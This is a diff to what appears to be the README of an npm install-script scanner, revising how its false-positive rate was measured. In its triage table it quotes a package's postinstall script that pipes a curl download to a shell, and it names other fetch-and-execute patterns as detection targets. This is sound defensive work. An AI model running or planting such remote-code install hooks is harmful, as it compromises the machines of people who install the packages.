@@ -123,19 +123,61 @@ measurement below: it's *exactly* why native-module packages test clean —
 their install step is almost always "run a local script," and the
 interesting logic (if any) lives inside a file this scanner doesn't open.
 
-**False-positive measurement:** before finalizing the pattern list, I
-pulled real registry metadata for packages known to use install scripts for
-legitimate reasons — native module builds (`node-gyp`, `node-gyp-build`,
-`prebuild-install`) or fetching prebuilt binaries — including the ones
-named in the brief (`node-sass`, `bcrypt`, `sharp`) plus 20 more real
-packages (`puppeteer`, `canvas`, `sqlite3`, `fsevents`, `esbuild`, `cypress`,
+**False-positive measurement — two passes, two different populations:**
+
+*Pass 1 (initial, narrow):* I first pulled real registry metadata for
+packages known to use install scripts for legitimate reasons — the ones
+named in the brief (`node-sass`, `bcrypt`, `sharp`) plus 20 more hand-picked
+real packages (`puppeteer`, `canvas`, `sqlite3`, `fsevents`, `esbuild`,
 `argon2`, `keytar`, `node-pty`, `leveldown`, etc. — full list in
-`test-fixtures/legit-install-scripts.json`, fetched directly from the
-registry). Result: **0/23 false positives.** Their scripts are things like
-`node-gyp rebuild`, `prebuild-install -r napi || node-gyp rebuild`, and
-`node scripts/install.js` — none contain the string-level patterns being
-checked for, which is exactly the intended behavior: flag the technique
-(fetch-and-execute inline), not the presence of a native build step.
+`test-fixtures/legit-install-scripts.json`). Result: 0/23 flagged. This is
+a real measurement, but a weak one — the sample was chosen specifically
+*because* these are well-known-legitimate packages, so a 0% rate mostly
+proves the pattern list doesn't break the packages I already knew were
+clean. It doesn't estimate a false-positive rate on packages in general.
+
+*Pass 2 (broader, unbiased-within-population):* to get an actual rate, I
+needed a sample not selected by "packages I already trust." A pure random
+sample doesn't work here — pulling 10,000 packages at random from the top
+10,000 by npm popularity and checking their scripts found only **5**
+with any `preinstall`/`install`/`postinstall` at all (a 0.05% incidence
+rate), nowhere near enough to benchmark against. Instead I searched the
+npm registry (`registry.npmjs.org/-/v1/search`) across 20 generic technical
+terms tied to native-build/install patterns — `node-gyp`, `prebuild`,
+`napi`, `bindings`, `postinstall`, `husky`, `opencollective`, `ffi`, `nan`,
+etc. (full query list in `test-fixtures/install-script-search-sample.json`)
+— which surfaced 4,675 unique candidate packages, of which **578** actually
+had a real lifecycle script when checked live against the registry. That
+578-package set is the false-positive benchmark.
+
+**Result: 4/578 flagged (0.69%).** I reviewed all four by hand:
+
+| package | flagged for | verdict |
+|---|---|---|
+| `@lavamoat/preinstall-always-fail` | `.npmrc` (suspicious write target) | **false positive** — its script is a warning message *telling the user* to configure `.npmrc`, not writing to it |
+| `ytdlp-nodejs` | `child_process` | **false positive** — uses `child_process.execSync` to run its own `npm run postdownload` script, a normal (if unusually-written) local invocation |
+| `projkit` | `child_process` | **false positive** — uses `child_process.execSync` to run its own bundled CLI and `chmod` a git hook file |
+| `safe-postinstall-test` | `curl` (network fetch) | **not a false positive** — its script is literally `node postinstall.js && curl https://example.com/ \| sh`, the exact curl-to-shell pattern this check exists to catch, despite the reassuring package name |
+
+So the *true* false-positive rate is closer to **3/578 (0.52%)** — the
+regression test (below) locks in the conservative, literal 4/578 bound
+from the automated count, since that's what the code reproducibly
+measures; the manual triage is judgment calls layered on top. The two real
+false positives share a root cause: `child_process` is flagged as a
+category regardless of *what* it invokes, and both are invoking the
+package's own bundled code, not spawning something external. A more
+precise check would distinguish "child_process running a path inside the
+package" from "child_process running a downloaded/external command" —
+noted under [What I'd add with more time](#what-id-add-with-more-time).
+
+**What population this is — and isn't:** "packages found via npm registry
+search for native-build/install-related terms, that turned out to have a
+real lifecycle script" is a real, broad, non-hand-picked population — but
+it is not the same as "a random sample of all packages with install
+scripts" (that population is too rare to sample directly, see above) and
+it is not the original 23 famous packages. Read the 0.69%/0.52% figures as
+specific to this search-defined population, not a universal false-positive
+rate for the internet's npm packages.
 
 **True-positive check:** synthetic scripts modeled on documented
 supply-chain attack techniques — `curl ... | bash`, `wget` + `chmod +x` +
@@ -211,11 +253,14 @@ Also covered for Phase 3 (`src/installScriptCheck.test.js` /
   trip anything).
 - **True positives** — the five synthetic attack-technique scripts described
   above, each asserted to produce the expected category.
-- **True negatives / FP regression** — every one of the 23 real legitimate
-  scripts in `test-fixtures/legit-install-scripts.json` asserted individually
-  (via `it.each`) to produce zero flags, plus one aggregate assertion that
-  the false-positive list is empty — so a future change to the pattern list
-  that breaks any single legitimate package fails loudly with its name.
+- **True negatives (named spot-check)** — every one of the 23 hand-picked
+  real legitimate scripts in `test-fixtures/legit-install-scripts.json`
+  asserted individually (via `it.each`) to produce zero flags — readable,
+  specific regression cases, not the false-positive rate claim.
+- **False-positive rate regression (unbiased sample)** — the 578-package
+  registry-search sample (`test-fixtures/install-script-search-sample.json`)
+  asserted to produce at most 4 flags, locking in the measured 0.69% rate
+  so a future change to the pattern list can't silently make it worse.
 - **Registry client** — `fetchPackageMetadata` tested with a mocked `fetch`
   (no live network in the suite): asserts repeated calls for the same
   package hit the network once, different packages each get their own
@@ -233,9 +278,11 @@ Fixtures:
   (exercised manually via the CLI; see Phase 2 commit for sample output).
 - `test-fixtures/popular-packages-1001-1500.json` — the 500-package
   false-positive benchmark sample for typosquat detection.
-- `test-fixtures/legit-install-scripts.json` — 23 real packages' install
-  scripts, fetched from the npm registry, for the install-script
-  false-positive benchmark above.
+- `test-fixtures/legit-install-scripts.json` — 23 hand-picked real
+  packages' install scripts (a named spot-check, not the FP-rate sample).
+- `test-fixtures/install-script-search-sample.json` — the 578-package
+  unbiased registry-search sample backing the actual false-positive rate
+  measurement above.
 - `test-fixtures/install-script-example-package.json` — a manifest mixing
   real native-build packages with a nonexistent package name, used to
   manually exercise the "not found on registry" path via the CLI.
